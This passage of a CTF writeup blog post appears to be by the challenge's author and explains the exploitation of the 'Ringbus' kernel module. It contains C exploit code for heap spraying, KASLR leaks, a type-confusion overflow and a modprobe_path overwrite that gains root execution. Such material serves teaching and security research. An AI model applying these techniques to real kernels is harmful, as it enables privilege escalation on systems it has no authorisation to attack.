fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="cm">/**
* Leak KASLR address by:
* - Cause a TX loop
* - Trigger deferred free using RST
* - Spray with seq_ops (contains kernel ptr)
* - Unloop and parse tx buf
*/</span>
<span class="kt">void</span> <span class="nf">kaslr_leak</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">spray</span><span class="p">[</span><span class="n">spray_size</span><span class="p">];</span>
    <span class="c1">// Disallow leak_buf so TX loop is triggered</span>
    <span class="n">mprotect</span><span class="p">(</span><span class="n">leak_buf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_NONE</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Starting read thread against unmapped region"</span><span class="p">);</span>
    <span class="c1">// Read forever in a seperate thread</span>
    <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">read_tx</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">uaf_thread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="c1">// RST 1: Reset seek</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">RST</span><span class="p">);</span>
    <span class="c1">// RST 2: free buf</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">RST</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"[+] Successfully RST"</span><span class="p">);</span>
    <span class="c1">// Fill hole with seq_op (kmalloc-cg-32)</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"[*] seq_op spray"</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">spray_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span><span class="n">spray</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/self/stat"</span><span class="p">,</span>
    <span class="n">O_RDONLY</span> <span class="o">|</span> <span class="n">O_NOCTTY</span><span class="p">);}</span>
    <span class="c1">// Hole filled with seq_op, end TX loop</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Re-mapping user buffer"</span><span class="p">);</span>
    <span class="n">mprotect</span><span class="p">(</span><span class="n">leak_buf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">);</span>
    <span class="n">pthread_join</span><span class="p">(</span><span class="n">read_tx</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">parse_leak_buf</span><span class="p">(</span><span class="n">kaslr_mask</span><span class="p">,</span> <span class="n">kaslr_leak_index</span><span class="p">,</span>
    <span class="n">modprobe_path_offset</span><span class="p">);</span>
    <span class="c1">// Free seq_ops</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">spray_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span><span class="n">close</span><span class="p">(</span><span class="n">spray</span><span class="p">[</span><span class="n">i</span><span class="p">]);}</span>
<span class="p">}</span>
</pre></table></code></div></div><h4 id="device-spray-kmalloc-cg-64-leak"><span class="me-2">device spray (kmalloc-cg-64 Leak)</span><a href="#device-spray-kmalloc-cg-64-leak" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>To craft my final primitive I ended up also needing a <code class="language-plaintext highlighter-rouge">kmalloc-cg-64</code> leak so that I am able to forge a fake <code class="language-plaintext highlighter-rouge">uart_ring</code>. To do this I use the same bug, but this time spray devices. Recall that devices are a doubly linked list of ring buffers so I will actually be leaking a <code class="language-plaintext highlighter-rouge">uart_ring</code> directly. This all re-occurs in the <code class="language-plaintext highlighter-rouge">kmalloc-cg-32</code> cache, which is why I first free my <code class="language-plaintext highlighter-rouge">seq_ops</code> from the first leak. Furthermore, these sprayed devices will prove a useful target for a later primitive so I leave them after spraying.</p><p>Code:</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="cm">/**
* Leak kmalloc-cg-64 address by:
* - Cause a TX loop
* - Trigger deferred free using RST
* - Spray with devices (next,prev ptrs)
* - Unloop and parse tx buf
*/</span>
<span class="kt">void</span> <span class="nf">cg_64_leak</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="c1">// Start TX loop</span>
    <span class="n">mprotect</span><span class="p">(</span><span class="n">leak_buf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_NONE</span><span class="p">);</span>
    <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">read_tx</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">uaf_thread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="c1">// RST race again</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">RST</span><span class="p">);</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">RST</span><span class="p">);</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">RST</span><span class="p">);</span>
    <span class="c1">// Spray devices for kmalloc-cg-64 leak</span>
    <span class="c1">// Will also scan list later for AAW</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">spray_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="n">devices</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">add_dev</span><span class="p">();</span>
    <span class="c1">// Hole filled with device, end TX loop</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Re-mapping user buffer"</span><span class="p">);</span>
    <span class="n">mprotect</span><span class="p">(</span><span class="n">leak_buf</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">);</span>
    <span class="n">pthread_join</span><span class="p">(</span><span class="n">read_tx</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">kmalloc_cg_64</span> <span class="o">=</span> <span class="n">parse_leak_buf</span><span class="p">(</span><span class="n">cg_64_mask</span><span class="p">,</span> <span class="n">cg_64_index</span><span class="p">,</span>
    <span class="n">fake_head_offset</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Now we have all needed leaks. <a href="/assets/posts/2025-10-31/6.png" class="popup img-link shimmer"><img src="/assets/posts/2025-10-31/6.png" alt="" loading="lazy"></a></p><p><a name="aaw"></a></p><h3 id="primitive-2-type-confusion-to-overflow-to-aaw"><span class="me-2">Primitive 2: Type-Confusion to Overflow to AAW</span><a href="#primitive-2-type-confusion-to-overflow-to-aaw" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="type-confusion"><span class="me-2">Type Confusion</span><a href="#type-confusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>This vulnerability is within the RX functionality and relies on a type confusion between <code class="language-plaintext highlighter-rouge">selected_device-&gt;len</code> and the length ultimately chosen in <code class="language-plaintext highlighter-rouge">rx_handle</code>. It is then used to set a very large n argument to <code class="language-plaintext highlighter-rouge">copy_from_user</code> and overflow a 32-byte <code class="language-plaintext highlighter-rouge">selected_device-&gt;buf</code>. Below better illustrates the issue: <a href="/assets/posts/2025-10-31/7.png" class="popup img-link shimmer"><img src="/assets/posts/2025-10-31/7.png" alt="" loading="lazy"></a></p><ol><li><code class="language-plaintext highlighter-rouge">length</code> checks that <code class="language-plaintext highlighter-rouge">dev-&gt;len</code> is less than <code class="language-plaintext highlighter-rouge">RING_SIZE-1</code>. Recall that <code class="language-plaintext highlighter-rouge">dev-&gt;len</code> is set using an ioctl as a default <code class="language-plaintext highlighter-rouge">signed int</code>, but returned here as an <code class="language-plaintext highlighter-rouge">unsigned long</code>. A user can set <code class="language-plaintext highlighter-rouge">dev-&gt;len</code> beforehand so that it wraps to a negative value (ioctls take an <code class="language-plaintext highlighter-rouge">unsigned long</code> argument so you can’t pass a negative value explicitly, so you must also wrap the int when initially setting it), then when this function is called, the comparison will be passed and <code class="language-plaintext highlighter-rouge">ret</code> will equal some very large value since <code class="language-plaintext highlighter-rouge">length</code> returns a negative value as an <code class="language-plaintext highlighter-rouge">unsigned long</code>.<li>Because ret is now very large, any len value passed via <code class="language-plaintext highlighter-rouge">write</code> will pass the <code class="language-plaintext highlighter-rouge">dev-&gt;len</code> comparison and be accepted.<li>Our n argument from <code class="language-plaintext highlighter-rouge">write(,,n)</code> will be used to copy from userspace to kernelspace <code class="language-plaintext highlighter-rouge">selected_dev-&gt;buf</code> in <code class="language-plaintext highlighter-rouge">kmalloc-cg-32</code>. We can choose an arbitrary n and have very granular control as to the size of the overflow. We use it in the future to only write one address length out of bounds.</ol><h4 id="slab-overflow"><span class="me-2">Slab Overflow</span><a href="#slab-overflow" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Recall the devices we sprayed into <code class="language-plaintext highlighter-rouge">kmalloc-cg-32</code> for our first leak. These would prove excellent candidates to change because they’d let us change a device in the devices list to craft an arbitrary <code class="language-plaintext highlighter-rouge">uart_ring</code>. But do note that RX writes <code class="language-plaintext highlighter-rouge">dev_selected-&gt;head</code>. This means that the address we use should point 8 bytes ahead of an address we’d like to write too. The game plan is illustrated below: <a href="/assets/posts/2025-10-31/8.png" class="popup img-link shimmer"><img src="/assets/posts/2025-10-31/8.png" alt="" loading="lazy"></a></p><p>As seen here, we take advantage of this overflow to craft the following AAW to overwrite <code class="language-plaintext highlighter-rouge">modprobe_path</code>. Using our <code class="language-plaintext highlighter-rouge">uart_ring</code> leak from earlier, we overwrite our (hopefully) adjacent device pointer so that it instead points to our leaked <code class="language-plaintext highlighter-rouge">uart_ring+32</code> this will shift the device so that the <code class="language-plaintext highlighter-rouge">t_setting</code> is instead treated as the <code class="language-plaintext highlighter-rouge">head</code> which we will write too later. As mentioned earlier, <code class="language-plaintext highlighter-rouge">t_setting</code> is an <code class="language-plaintext highlighter-rouge">unsigned long</code> and we are able to set it, making it a perfect address holder. We opt here for the <a href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique">modprobe_path method</a> to achieve root command execution. We should utilize this technique after ensuring all devices from the earlier spray are setup in such a way that allows us to use them in this manner since we do not know which device may be adjacent to our overflow. This scanning process brings us to the final section.</p><p><a name="trigger"></a></p><h3 id="scan-devices-and-trigger"><span class="me-2">Scan Devices and Trigger</span><a href="#scan-devices-and-trigger" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Given that we have no way of knowing which device or even if a device will be adjacent, the reliability concern of the exploit is finally raised here. Assuming we are not unlucky, we need to ensure that each device from the earlier spray is configured in such a way that it gives us our final primitive. So, we must set up and treat each device as if it is adjacent to our overflow in <code class="language-plaintext highlighter-rouge">kmalloc-cg-32</code>. Here, I simply save a device which I will use for the overflow primitive later, then I scan the saved devices from earlier, updating the length so that I can copy at least 64 bytes to the location, and the <code class="language-plaintext highlighter-rouge">t_setting</code> so that it points to our calculated <code class="language-plaintext highlighter-rouge">modprobe_path</code>.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="cm">/**
* Arbitrary Write
*/</span>
<span class="n">oob_dev</span> <span class="o">=</span> <span class="n">add_dev</span><span class="p">();</span>
<span class="c1">// Configure all devices as if they landed adjacently to oob_dev</span>
<span class="c1">// - len = 64</span>
<span class="c1">// -- So we can RX plenty of data into uart_ring-&gt;head</span>
<span class="c1">// - t_setting = &amp;modprobe_path</span>
<span class="c1">// -- This is so we can use t_setting as a fake uart_ring-&gt;head</span>
<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">spray_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
    <span class="n">select_dev</span><span class="p">(</span><span class="n">devices</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="n">len_set</span><span class="p">(</span><span class="mi">64</span><span class="p">);</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">TX_INSIST_MODE</span><span class="p">,</span> <span class="n">modprobe_path</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>After this is complete, I can use the overflow, and then write my fake modprobe path to each device in the list.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="c1">// Trigger length integer overflow</span>
<span class="c1">// - length() will return dev-&gt;len (int) as an unsigned long</span>
<span class="c1">// -- Magic number below will wrap so that dev-&gt;len is negative</span>
<span class="c1">// - Since arg0 (from write arg) &lt; arg1 (len_set) arg0 is used</span>
<span class="c1">// - Can call write w/ arbitrary length argument</span>
<span class="n">select_dev</span><span class="p">(</span><span class="n">oob_dev</span><span class="p">);</span>
<span class="n">len_set</span><span class="p">(</span><span class="mi">5368324604406717569</span><span class="p">);</span>
<span class="c1">// Payload</span>
<span class="c1">// - Padding</span>
<span class="c1">// -- Recall RING_SIZE = 32</span>
<span class="c1">// - Fake uart_ring</span>
<span class="c1">// -- Misalign uart_ring leak from earlier so that</span>
<span class="c1">// -- uart_ring-&gt;head points to t_settings (RX writes to head)</span>
<span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="p">];</span>
<span class="n">memset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>
<span class="n">memcpy</span><span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="n">offset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kmalloc_cg_64</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kmalloc_cg_64</span><span class="p">));</span>
<span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span> <span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="p">);</span>
<span class="c1">// Scan AAW</span>
<span class="c1">// - One of these devices is hopefully adjacent to oob_dev</span>
<span class="c1">// - Send "/tmp/e" to all devices until modprobe_path is overwritten</span>
<span class="c1">// - "/tmp/e" will be our fake modprobe binary</span>
<span class="kt">char</span> <span class="o">*</span> <span class="n">path</span> <span class="o">=</span> <span class="s">"/tmp/e"</span><span class="p">;</span>
<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">spray_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
    <span class="n">select_dev</span><span class="p">(</span><span class="n">devices</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
<span class="p">}</span>
<span class="c1">// Hopefully that worked</span>
<span class="c1">// Attempt modprobe_path hijack</span>
<span class="n">get_flag</span><span class="p">();</span>
</pre></table></code></div></div><p>Final solve in action: <a href="/assets/posts/2025-10-31/2.gif" class="popup img-link shimmer"><img src="/assets/posts/2025-10-31/2.gif" alt="" loading="lazy"></a></p><p><a name="closing"></a></p><h3 id="closing-thoughts"><span class="me-2">Closing Thoughts</span><a href="#closing-thoughts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Although I was directed to make a challenge that was embedded themed, I also really wanted to make my first kernel heap challenge, so I thank you for suspending disbelief and accepting that an embedded device would use a semi-recent kernel or (more obviously) a SLUB allocator. I designed this challenge to highlight some recurring themes one might find when doing vulnerability research in kernel modules such as bad lifetime management (deferred frees + race windows) compound into powerful primitives when paired with general allocator exploitation techniques such as heap spraying. The intentional exploit path here, was intentionally layered and sequential, leak, spray, type confusion, overflow, and finally AAW.</p><p>Some other exploitation scenarios to consider (and perhaps try, reach out if you do), could entail only using the first leak primitive. One could break safe linking by both reading an fd and a NULL fd in the same slab, allowing one to link a fake block. Furthermore, a player also made me aware of how they were able to use solely the first primitive by causing a kernel panic to leak the flag (initramfs is scannable in memory with qemu). Below is that conversation. <a href="/assets/posts/2025-10-31/9.png" class="popup img-link shimmer"><img src="/assets/posts/2025-10-31/9.png" alt="" loading="lazy"></a></p><p>If you enjoyed this challenge, you may like digging into:</p><ul><li>Looking at some real CVEs in linux subsystems, alot of which utilize heap spraying.<li>pwn.college’s kernel exploitation material.<li>More interesting writeups that touch on bypassing other mitigations and cross-cache attacks.</ul><p>Good luck and happy pwns!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/ctf/">CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/kernel/" class="post-tag no-text-decoration" >kernel</a> <a href="/tags/slub/" class="post-tag no-text-decoration" >slub</a> <a href="/tags/heap/" class="post-tag no-text-decoration" >heap</a> <a href="/tags/uaf/" class="post-tag no-text-decoration" >uaf</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Ringbus:%20Deferred%20Free%20Across%20Caches%20(Writeup)%20-%20FaultPoint&url=https%3A%2F%2Ffaultpoint.com%2Fposts%2Fringbus%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Ringbus:%20Deferred%20Free%20Across%20Caches%20(Writeup)%20-%20FaultPoint&u=https%3A%2F%2Ffaultpoint.com%2Fposts%2Fringbus%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Ffaultpoint.com%2Fposts%2Fringbus%2F&text=Ringbus:%20Deferred%20Free%20Across%20Caches%20(Writeup)%20-%20FaultPoint" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/battelle-magical-goat/">Feed the Magical Goat (Battelle)</a><li class="text-truncate lh-lg"> <a href="/posts/ransomware-and-geopolitics-for-dummies/">International Implications of Ransomware for Dummies</a><li class="text-truncate lh-lg"> <a href="/posts/running-a-ctf-wo-lifesupport/">Running a CTF that Outlasts a Bag of Popcorn</a><li class="text-truncate lh-lg"> <a href="/posts/8-cves-on-the-wnr854t-junkyard/">'You Left this on the Internet?' Finding 8 Zero Days in the WNR854T for DistrictCon Junkyard</a><li class="text-truncate lh-lg"> <a href="/posts/ringbus/">Ringbus: Deferred Free Across Caches (Writeup)</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a> <a class="post-tag btn btn-outline-primary" href="/tags/firmware-rev/">firmware rev</a> <a class="post-tag btn btn-outline-primary" href="/tags/embedded/">embedded</a> <a class="post-tag btn btn-outline-primary" href="/tags/angr/">angr</a> <a class="post-tag btn btn-outline-primary" href="/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/tags/badge/">badge</a> <a class="post-tag btn btn-outline-primary" href="/tags/chip-extraction/">chip extraction</a> <a class="post-tag btn btn-outline-primary" href="/tags/docker/">docker</a> <a class="post-tag btn btn-outline-primary" href="/tags/emulation/">emulation</a> <a class="post-tag btn btn-outline-primary" href="/tags/file-sim/">file-sim</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/running-a-ctf-wo-lifesupport/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1694404800" data-df="ll" > Sep 11, 2023 </time><h4 class="pt-0 my-2">Running a CTF that Outlasts a Bag of Popcorn</h4><div class="text-muted"><p>Tales and experiences from running PatriotCTF 2023.</p></div></div></a></article><article class="col"> <a href="/posts/How-to-srop/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1694404800" data-df="ll" > Sep 11, 2023 </time><h4 class="pt-0 my-2">Return to Sigreturn</h4><div class="text-muted"><p>A really simple writeup for an srop challenge.</p></div></div></a></article><article class="col"> <a href="/posts/battelle-magical-goat/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1679544000" data-df="ll" > Mar 23, 2023 </time><h4 class="pt-0 my-2">Feed the Magical Goat (Battelle)</h4><div class="text-muted"><p>Reversing challenge from Battelle showcasing angr's file simulation feature.</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/8-cves-on-the-wnr854t-junkyard/" class="btn btn-outline-primary" aria-label="Older" ><p>'You Left this on the Internet?' Finding 8 Zero Days in the WNR854T for DistrictCon Junkyard</p></a><div class="btn btn-outline-primary disabled" aria-label="Newer"><p>-</p></div></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://twitter.com/elbee_ez">Dylan Knoff</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.4.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a> <a class="post-tag btn btn-outline-primary" href="/tags/firmware-rev/">firmware rev</a> <a class="post-tag btn btn-outline-primary" href="/tags/embedded/">embedded</a> <a class="post-tag btn btn-outline-primary" href="/tags/angr/">angr</a> <a class="post-tag btn btn-outline-primary" href="/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/tags/badge/">badge</a> <a class="post-tag btn btn-outline-primary" href="/tags/chip-extraction/">chip extraction</a> <a class="post-tag btn btn-outline-primary" href="/tags/docker/">docker</a> <a class="post-tag btn btn-outline-primary" href="/tags/emulation/">emulation</a> <a class="post-tag btn btn-outline-primary" href="/tags/file-sim/">file-sim</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{content}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
